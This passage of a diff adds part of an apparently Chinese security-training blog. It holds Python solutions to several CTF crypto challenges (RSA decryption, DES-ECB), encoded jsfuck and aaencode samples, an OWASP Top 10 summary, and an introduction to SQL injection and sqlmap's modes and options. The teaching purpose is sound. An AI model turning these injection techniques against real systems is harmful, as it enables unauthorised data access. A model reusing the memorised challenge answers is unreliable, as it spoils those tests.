+print(&#39;d = &#39;+str(d))
+m=pow(c,d,n)   #快速幂取模
+print(&#39;m = &#39;+str(m))</code></pre>
+</li>
+</ul>
+<p><strong>常见题型的分类</strong></p>
+<p><strong>（1）已知p、q、e求解d</strong></p>
+<p><strong>解题思路：</strong>根据 φ = (p−1) * (q−1)这一欧拉函数式， 可以使用所给的p、q求解出n的欧拉函数值φ,之后再根据       e * d ≡ 1 (mod φ) 即可求解出d的值。</p>
+<p>题目</p>
+<p><a target="_blank" rel="noopener" href="http://www.shiyanbar.com/ctf/1828">http://www.shiyanbar.com/ctf/1828</a></p>
+<p>代码</p>
+<pre><code class="python">#!/usr/bin/python
+
+
+def egcd(a, b):   #求d
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        exit(&#39;wrong&#39;)
+    else:
+        return x % m
+
+def main():
+    p=473398607161
+    q=4511491
+    e=17
+    f_n=(p-1)*(q-1)
+    d=modinv(e,f_n)
+    print(d)
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+<p><strong>已知p、q、e、c求解明文</strong></p>
+<p><strong>思路：</strong>根据<strong>n=p<em>q<strong>求解出n的值，之后再根据</strong>φ = (p−1) * (q−1)*</em>，求解出n的欧拉函数的值，之后再根据</strong>e * d ≡ 1 (mod φ)<strong>求解出d的值，之后再根据</strong>m≡c^d( mod n) 或 m = pow(c,d,n)**求解出明文信息即可！</p>
+<p>题目</p>
+<p><a target="_blank" rel="noopener" href="http://www.shiyanbar.com/ctf/1979">http://www.shiyanbar.com/ctf/1979</a></p>
+<p>代码</p>
+<pre><code class="python">#-*-coding:utf-8-*-
+
+
+def egcd(a, b):   #求d
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        exit(&#39;wrong&#39;)
+    else:
+        return x % m
+
+e=65537
+p=9648423029010515676590551740010426534945737639235739800643989352039852507298491399561035009163427050370107570733633350911691280297777160200625281665378483
+q=11874843837980297032092405848653656852760910154543380907650040190704283358909208578251063047732443992230647903887510065547947313543299303261986053486569407
+c=83208298995174604174773590298203639360540024871256126892889661345742403314929861939100492666605647316646576486526217457006376842280869728581726746401583705899941768214138742259689334840735633553053887641847651173776251820293087212885670180367406807406765923638973161375817392737747832762751690104423869019034
+
+n=p*q
+f_n=(p-1)*(q-1)
+print(&#39;n:%d&#39;%n)
+print(&#39;e:%d&#39;%e)
+print(&#39;c:%d&#39;%c)
+
+d=modinv(e,f_n)
+print(&#39;d = &#39;+str(d))
+
+m=pow(c,d,n)
+print(&quot;------------&quot;)
+print(&#39;message:%d&#39;%m)
+
+</code></pre>
+<p>题目</p>
+<p><a target="_blank" rel="noopener" href="http://ctf5.shiyanbar.com/crypto/RSAROLL.txt">http://ctf5.shiyanbar.com/crypto/RSAROLL.txt</a></p>
+<pre><code class="python">#-*-coding:utf-8-*-
+
+def split_n(n):   #分解n
+    for i in range(2,n):
+        if n%i == 0:
+            p = i
+            q = int(n/i)
+            break
+    return p,q
+
+def egcd(a, b):   #求d
+    if a == 0:
+        return (b, 0, 1)
+    else:
+        g, y, x = egcd(b % a, a)
+        return (g, x - (b // a) * y, y)
+def modinv(a, m):
+    g, x, y = egcd(a, m)
+    if g != 1:
+        exit(&#39;wrong&#39;)
+    else:
+        return x % m
+
+e=19
+n=920139713
+
+res=&#39;&#39;
+p,q=split_n(n)
+print(&#39;n:%d&#39;%n)
+print(&#39;e:%d&#39;%e)
+print(&quot;p = &quot; + str(p))
+print(&quot;q = &quot; + str(q))
+d=modinv(e,(p-1)*(q-1))
+print(&#39;d = &#39;+str(d))
+with open(&#39;rsa.txt&#39;) as f:
+    for c in f:
+        res+=chr(pow(int(c.replace(&#39;\n&#39;,&#39;&#39;)),d,n))
+print(res)
+
+</code></pre>
+<ul>
+<li><p>DES（对称算法）</p>
+<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_42606051/article/details/81279504">https://blog.csdn.net/qq_42606051/article/details/81279504</a></p>
+<p>题目</p>
+<pre><code class="txt">密文：74cWby3JysahM3cZudF3gT11lamL/4Cd
+key=12345678
+求明文</code></pre>
+</li>
+</ul>
+<p>  代码</p>
+<pre><code class="python"># -*-coding:utf-8-*-
+
+from Crypto.Cipher import DES
+import base64
+
+
+key = &#39;12345678&#39;
+
+des = DES.new(key,DES.MODE_ECB)
+
+encrypted_text=base64.b64decode(&#39;74cWby3JysahM3cZudF3gT11lamL/4Cd&#39;)
+
+decrypted_text = des.decrypt(encrypted_text)
+print &quot;明文:&quot;+decrypted_text</code></pre>
+<p>  <img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080611.png"></p>
+<ul>
+<li><a target="_blank" rel="noopener" href="https://blog.csdn.net/iteye_6478/article/details/82165923">https://blog.csdn.net/iteye_6478/article/details/82165923</a></li>
+</ul>
+<ul>
+<li><p>拓展</p>
+<p>与佛论禅</p>
+<ul>
+<li><p><a target="_blank" rel="noopener" href="http://www.keyfc.net/bbs/tools/tudoucode.aspx">http://www.keyfc.net/bbs/tools/tudoucode.aspx</a></p>
+</li>
+<li><pre><code class="txt">怯勝苦集參哆究梵礙呐度究梵呼梵顛以怯勝豆哆陀哆真罰夜大知涅曳他呐依道多波缽喝侄波缽羅奢喝俱咒冥上奢阿怯喝侄羅以侄朋僧哆婆謹冥地諳顛哆度哆都冥寫有呐阿勝娑哆涅皤怛。怯苦怯南是哆得謹侄訶至故殿故僧道多地罰倒皤利奢喝呐南奢都哆。切是奢究奢藝侄參哆佛曰明諳道彌奢娑阿哆寫娑利梵姪若諦竟奢藐悉奢集諳彌諳遮怯。皤喝阿孕怯曰罰般梵多伊梵耨死哆彌阿輸呐遮冥上哆藐夷冥輸俱故沙恐冥薩侄栗世得。耨夢諳智都冥薩耨俱薩皤密吉怖罰想上罰喝訶罰蒙盧舍神藝哆知呐姪怯那楞皤度遮奢顛度梵咒呐訶悉梵利究即冥夢諳一俱娑怯沙俱三奢婆缽知侄無呐若槃醯想哆故冥怖沙諳一豆曳呐咒心羯有
+
+</code></pre>
+</li>
+</ul>
+</li>
+</ul>
+<pre><code>```</code></pre>
+<ul>
+<li>解密前要带上<code>佛曰：</code>或<code>如是我闻：</code>的文字。</li>
+</ul>
+<ul>
+<li><p>aaencode</p>
+<pre><code class="txt">ﾟωﾟﾉ= /｀ｍ´）ﾉ ~┻━┻   //*´∇｀*/ [&#39;_&#39;]; o=(ﾟｰﾟ)  =_=3; c=(ﾟΘﾟ) =(ﾟｰﾟ)-(ﾟｰﾟ); (ﾟДﾟ) =(ﾟΘﾟ)= (o^_^o)/ (o^_^o);(ﾟДﾟ)=&#123;ﾟΘﾟ: &#39;_&#39; ,ﾟωﾟﾉ : ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟΘﾟ] ,ﾟｰﾟﾉ :(ﾟωﾟﾉ+ &#39;_&#39;)[o^_^o -(ﾟΘﾟ)] ,ﾟДﾟﾉ:((ﾟｰﾟ==3) +&#39;_&#39;)[ﾟｰﾟ] &#125;; (ﾟДﾟ) [ﾟΘﾟ] =((ﾟωﾟﾉ==3) +&#39;_&#39;) [c^_^o];(ﾟДﾟ) [&#39;c&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ (ﾟｰﾟ)+(ﾟｰﾟ)-(ﾟΘﾟ) ];(ﾟДﾟ) [&#39;o&#39;] = ((ﾟДﾟ)+&#39;_&#39;) [ﾟΘﾟ];(ﾟoﾟ)=(ﾟДﾟ) [&#39;c&#39;]+(ﾟДﾟ) [&#39;o&#39;]+(ﾟωﾟﾉ +&#39;_&#39;)[ﾟΘﾟ]+ ((ﾟωﾟﾉ==3) +&#39;_&#39;) [ﾟｰﾟ] + ((ﾟДﾟ) +&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ ((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+((ﾟｰﾟ==3) +&#39;_&#39;) [(ﾟｰﾟ) - (ﾟΘﾟ)]+(ﾟДﾟ) [&#39;c&#39;]+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ)+(ﾟｰﾟ)]+ (ﾟДﾟ) [&#39;o&#39;]+((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ];(ﾟДﾟ) [&#39;_&#39;] =(o^_^o) [ﾟoﾟ] [ﾟoﾟ];(ﾟεﾟ)=((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟДﾟ) .ﾟДﾟﾉ+((ﾟДﾟ)+&#39;_&#39;) [(ﾟｰﾟ) + (ﾟｰﾟ)]+((ﾟｰﾟ==3) +&#39;_&#39;) [o^_^o -ﾟΘﾟ]+((ﾟｰﾟ==3) +&#39;_&#39;) [ﾟΘﾟ]+ (ﾟωﾟﾉ +&#39;_&#39;) [ﾟΘﾟ]; (ﾟｰﾟ)+=(ﾟΘﾟ); (ﾟДﾟ)[ﾟεﾟ]=&#39;\\&#39;; (ﾟДﾟ).ﾟΘﾟﾉ=(ﾟДﾟ+ ﾟｰﾟ)[o^_^o -(ﾟΘﾟ)];(oﾟｰﾟo)=(ﾟωﾟﾉ +&#39;_&#39;)[c^_^o];(ﾟДﾟ) [ﾟoﾟ]=&#39;\&quot;&#39;;(ﾟДﾟ) [&#39;_&#39;] ( (ﾟДﾟ) [&#39;_&#39;] (ﾟεﾟ+(ﾟДﾟ)[ﾟoﾟ]+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (c^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ (ﾟｰﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (o^_^o)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ (ﾟｰﾟ)+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((o^_^o) +(o^_^o))+ ((o^_^o) +(o^_^o))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟΘﾟ)+ ((ﾟｰﾟ) + (o^_^o))+ ((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+(ﾟｰﾟ)+ ((o^_^o) - (ﾟΘﾟ))+ (ﾟДﾟ)[ﾟεﾟ]+((ﾟｰﾟ) + (ﾟΘﾟ))+ (ﾟΘﾟ)+ (ﾟДﾟ)[ﾟoﾟ]) (ﾟΘﾟ)) (&#39;_&#39;);</code></pre>
+<ul>
+<li>解密网站  <a target="_blank" rel="noopener" href="https://www.qtool.net/decode">https://www.qtool.net/decode</a></li>
+</ul>
+</li>
+</ul>
+<ul>
+<li><p>jsfuck</p>
+<pre><code class="txt">(![]+[])[+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+!+[]]+(!![]+[])[+[]]+([][[]]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[!+[]+!+[]]]+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+(![]+[])[+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[+!+[]]+(![]+[+[]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]])[!+[]+!+[]+[+[]]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]+(+(+!+[]+[+[]]+[+!+[]]))[(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([]+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]][([][[]]+[])[+!+[]]+(![]+[])[+!+[]]+((+[])[([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(![]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[])[+!+[]]+([][[]]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]+[])[+!+[]+[+!+[]]]+(!![]+[])[!+[]+!+[]+!+[]]]](!+[]+!+[]+[+!+[]])[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[(![]+[])[!+[]+!+[]+!+[]]+(![]+[])[!+[]+!+[]]+([![]]+[][[]])[+!+[]+[+[]]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]]((+((+(+!+[]+[+!+[]]+(!![]+[])[!+[]+!+[]+!+[]]+[!+[]+!+[]]+[+[]])+[])[+!+[]]+[+[]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+[]]+[+!+[]]])+[])[!+[]+!+[]]+[+!+[]])+([]+[])[(![]+[])[+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+([][[]]+[])[+!+[]]+(!![]+[])[+[]]+([][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]]+[])[!+[]+!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(!![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[+!+[]+[+[]]]+(!![]+[])[+!+[]]]()[+!+[]+[!+[]+!+[]]]+([+[]]+![]+[][(![]+[])[+[]]+([![]]+[][[]])[+!+[]+[+[]]]+(![]+[])[!+[]+!+[]]+(![]+[])[!+[]+!+[]]])[!+[]+!+[]+[+[]]]</code></pre>
+<p>chrome控制台解密</p>
+</li>
+</ul>
+<h2 id="day03–7iny"><a href="#day03–7iny" class="headerlink" title="day03–7iny"></a>day03–7iny</h2><h3 id="前言-1"><a href="#前言-1" class="headerlink" title="前言"></a>前言</h3><p>以下内容以web安全为主，Danie1整理的内网地址为实验室靶场环境，三康庙职业技术学院的同学可在校园网环境下访问。不可访问的同学理解原理学习即可</p>
+<h3 id="OWASP-TOP-10漏洞"><a href="#OWASP-TOP-10漏洞" class="headerlink" title="OWASP TOP 10漏洞"></a>OWASP TOP 10漏洞</h3><h4 id="思维导图"><a href="#思维导图" class="headerlink" title="思维导图"></a>思维导图</h4><p>2017版TOP10思维导图</p>
+<p><img src="https://raw.githubusercontent.com/N407PengYuYan/img/master/img/2019080701.png"></p>
+<h4 id="TOP10漏洞介绍"><a href="#TOP10漏洞介绍" class="headerlink" title="TOP10漏洞介绍"></a>TOP10漏洞介绍</h4><h5 id="A1-注入-Injection"><a href="#A1-注入-Injection" class="headerlink" title="A1 注入 Injection"></a>A1 注入 Injection</h5><blockquote>
+<p>Web安全头号大敌。注入攻击漏洞往往是应用程序缺少对输入进行安全性检查所引起的。攻击者把一些包含攻击代码当做命令或者查询语句发送给解释器，这些恶意数据可以欺骗解释器，从而执行计划外的命令或者未授权访问数据。注入漏洞通常能SQL查询、LDAP查询、OS命令、程序参数等中出现</p>
+</blockquote>
+<h5 id="A2-失效的身份认证和会话管理-Broken-Authentication-and-Session-Management"><a href="#A2-失效的身份认证和会话管理-Broken-Authentication-and-Session-Management" class="headerlink" title="A2 失效的身份认证和会话管理  Broken Authentication and Session Management"></a>A2 失效的身份认证和会话管理  Broken Authentication and Session Management</h5><blockquote>
+<p>与认证和会话管理相关的应用程序功能往往得不到正确管理，这就导致攻击者破坏密码、密匙、会话令牌或利用实施漏洞冒充其他用户身份。</p>
+</blockquote>
+<h5 id="A3-跨站脚本-XSS"><a href="#A3-跨站脚本-XSS" class="headerlink" title="A3 跨站脚本-XSS"></a>A3 跨站脚本-XSS</h5><blockquote>
+<p>XSS的出现时间跟SQL差不多，是最普遍的web应用安全漏洞。当应用程序在发送给浏览器的页面中包含用户提供的数据，但没有经过适当验证或转译，就会导致跨站脚本漏洞。XSS允许攻击者在受害者的浏览器中执行脚本，这些脚本可以劫持用户会话，破坏网站，或将用户重定向到恶意站点。</p>
+</blockquote>
+<h5 id="A4-不安全的直接对象引用-Insecurity-Direct-Object-Reference"><a href="#A4-不安全的直接对象引用-Insecurity-Direct-Object-Reference" class="headerlink" title="A4 不安全的直接对象引用 Insecurity Direct Object Reference"></a>A4 不安全的直接对象引用 Insecurity Direct Object Reference</h5><blockquote>
+<p>当开发人员公开对内部实现对象(如文件、目录或数据库键)的引用时，就会出现直接对象引用。如果没有访问控制检查或其他保护，攻击者可以操纵这些引用来访问未经授权的数据。</p>
+</blockquote>
+<h5 id="A5-安全配置错误-Security-Misconfiguration"><a href="#A5-安全配置错误-Security-Misconfiguration" class="headerlink" title="A5 安全配置错误 Security Misconfiguration"></a>A5 安全配置错误 Security Misconfiguration</h5><blockquote>
+<p>良好的安全性需要为应用程序、框架、应用服务器、web服务器、数据库服务器和平台定义和部署安全配置。默认值通常是不安全的。另外，软件应该保持更新。攻击者通过访问默认账户、未使用的网页、未安装补丁的漏洞、未被保护的文件和目录等，以获得对系统未授权的访问。</p>
+</blockquote>
+<h5 id="A6-敏感信息泄露-Sensitive-Data-Exposure"><a href="#A6-敏感信息泄露-Sensitive-Data-Exposure" class="headerlink" title="A6 敏感信息泄露 Sensitive Data Exposure"></a>A6 敏感信息泄露 Sensitive Data Exposure</h5><blockquote>
+<p>保护与加密敏感数据已经成为网络应用的最重要的组成部分。最常见的漏洞是应该进行加密的数据没有进行加密。使用加密的情况下常见问题是不安全的密钥和使用弱算法加密。</p>
+</blockquote>
+<h5 id="A7-缺少功能级访问控制"><a href="#A7-缺少功能级访问控制" class="headerlink" title="A7 缺少功能级访问控制"></a>A7 缺少功能级访问控制</h5><blockquote>
+<p>大多数web应用程序在实现UI中可见的功能之前，都要验证功能级别的访问权限。但是，当访问每个函数时，应用程序需要在服务器上执行相同的访问控制检查。如果请求没有得到验证，攻击者将能够伪造请求，以便在没有适当授权的情况下访问功能。</p>
+</blockquote>
+<h5 id="A8-跨站请求伪造-CSRF"><a href="#A8-跨站请求伪造-CSRF" class="headerlink" title="A8 跨站请求伪造 CSRF"></a>A8 跨站请求伪造 CSRF</h5><blockquote>
+<p>利用了网站允许攻击者预测特定操作的所有细节这一特点。由于浏览器自动发送会话cookie等认证凭证，导致攻击者能够创建恶意的web页面来伪造请求。这些伪造的请求很难和合法的请求区分开。CSRF通过伪装来自受信任用户的请求来利用受信任的网站。</p>
+</blockquote>
+<h5 id="A9-使用含有已知漏洞的组件"><a href="#A9-使用含有已知漏洞的组件" class="headerlink" title="A9 使用含有已知漏洞的组件"></a>A9 使用含有已知漏洞的组件</h5><blockquote>
+<p>开发人员使用的组件也会含有漏洞，这些漏洞能够被自动化工具发现和利用。然后攻击者根据需要定制攻击代码并实施攻击。</p>
+</blockquote>
+<h5 id="A10-未验证的重定向和转发"><a href="#A10-未验证的重定向和转发" class="headerlink" title="A10 未验证的重定向和转发"></a>A10 未验证的重定向和转发</h5><blockquote>
+<p>应用程序经常将用户重定向到其他网页，或以类似的方式进行内部转发。当目标网页是通过一个未验证的参数来指定时，就容易被攻击者利用。攻击者通过诱使受害人去点击未经验证的重定向链接，从而利用不安全的转发绕过安全检测。攻击者通过重定向可以试图安装恶意软件或者诱使受害人泄露密码等敏感信息，通过转发可以绕过访问控制。</p>
+</blockquote>
+<p><a target="_blank" rel="noopener" href="https://www.jianshu.com/p/1440c2035b28">详细介绍</a></p>
+<h3 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h3><h4 id="简介"><a href="#简介" class="headerlink" title="简介"></a>简介</h4><p>在owasp发布的top 10漏洞里面，注入漏洞一直是危害排名第一，其中数据库注入漏洞是危害最大也是最受关注的漏洞。</p>
+<p>当攻击者发送的sql语句被sql解释器执行，通过执行这些恶意语句欺骗数据库执行，导致数据库信息泄露。</p>
+<h4 id="教程推荐"><a href="#教程推荐" class="headerlink" title="教程推荐"></a>教程推荐</h4><ul>
+<li><p>看雪图书</p>
+<p>1、<a target="_blank" rel="noopener" href="https://www.kanxue.com/book-6-110.htm">sql注入的原理与分类</a></p>
+<p>2、<a target="_blank" rel="noopener" href="https://www.kanxue.com/book-6-111.htm">盲注</a></p>
+<p>3、<a target="_blank" rel="noopener" href="https://www.kanxue.com/book-6-112.htm">DVWA SQL Injection分析与利用</a></p>
+<p>4、<a target="_blank" rel="noopener" href="https://www.kanxue.com/book-6-113.htm">DVWA SQL Injection (Blind)分析与利用</a></p>
+<p>5、<a target="_blank" rel="noopener" href="https://www.kanxue.com/book-6-114.htm">Sqlmap盲注利用</a></p>
+<p>6、<a target="_blank" rel="noopener" href="https://www.kanxue.com/book-6-115.htm">防范sql注入</a></p>
+</li>
+</ul>
+<h4 id="sqlmap安装"><a href="#sqlmap安装" class="headerlink" title="sqlmap安装"></a>sqlmap安装</h4><p><em>sqlmap</em>的使用需要<em>python</em>环境</p>
+<p>1.python下载：<a target="_blank" rel="noopener" href="https://www.python.org/downloads/">官网</a></p>
+<p>2.sqlmap下载：<a target="_blank" rel="noopener" href="http://sqlmap.org/">官网</a></p>
+<blockquote>
+<p>1.将下载的SQLMAP安装包解压到文件夹sqlmap中，并拷贝到 Python27 安装目录下</p>
+<p>2.在文件夹下创建sqlmap.bat ,内容为cmd.exe，创建桌面快捷方式</p>
+</blockquote>
+<h4 id="sqlmap作用"><a href="#sqlmap作用" class="headerlink" title="sqlmap作用"></a>sqlmap作用</h4><p>1、判断可注入的参数</p>
+<p>2、判断可以用那种SQL注入技术来注入</p>
+<p>3、识别出哪种数据库</p>
+<p>4、根据用户选择，读取哪些数据</p>
+<p><strong>sqlmap支持五种不同的注入模式</strong>：</p>
+<p>1、基于布尔的盲注，即可以根据返回页面判断条件真假的注入。</p>
+<p>2、基于时间的盲注，即不能根据页面返回内容判断任何信息，用条件语句查看时间延迟语句是否执行（即页面返回时间是否增加）来判断。</p>
+<p>3、基于报错注入，即页面会返回错误信息，或者把注入的语句的结果直接返回在页面中。</p>
+<p>4、联合查询注入，可以使用union的情况下的注入。</p>
+<p>5、堆查询注入，可以同时执行多条语句的执行时的注入。</p>
+<p><strong>sqlmap支持的数据库有</strong>：</p>
+<p>MySQL, Oracle, PostgreSQL, Microsoft SQL Server, Microsoft Access, IBM DB2, SQLite, Firebird, Sybase和SAP MaxDB</p>
+<p>测试GET参数，POST参数，HTTP Cookie参数，HTTP User-Agent头和HTTP Referer头来确认是否有SQL注入，它也可以指定用逗号分隔的列表的具体参数来测试。</p>
+<p>可以设定HTTP(S)请求的并发数，来提高盲注时的效率。</p>
+<p>如果你想观察sqlmap对一个点是进行了怎样的尝试判断以及读取数据的，可以使用-v参数。</p>
+<p>共有七个等级，默认为1：</p>
+<p>0、只显示python错误以及严重的信息。</p>
+<p>1、同时显示基本信息和警告信息。（默认）</p>
+<p>2、同时显示debug信息。</p>
+<p>3、同时显示注入的payload。</p>
+<p>4、同时显示HTTP请求。</p>
+<p>5、同时显示HTTP响应头。</p>
+<p>6、同时显示HTTP响应页面。</p>
+<p>如果你想看到sqlmap发送的测试payload最好的等级就是3。</p>
+<p>更详细介绍<a target="_blank" rel="noopener" href="https://www.jianshu.com/p/4fb15a2c9040">参考博客</a></p>
+<h4 id="sqlmap基本操作"><a href="#sqlmap基本操作" class="headerlink" title="sqlmap基本操作"></a>sqlmap基本操作</h4><ul>
+<li><p>检测注入点</p>
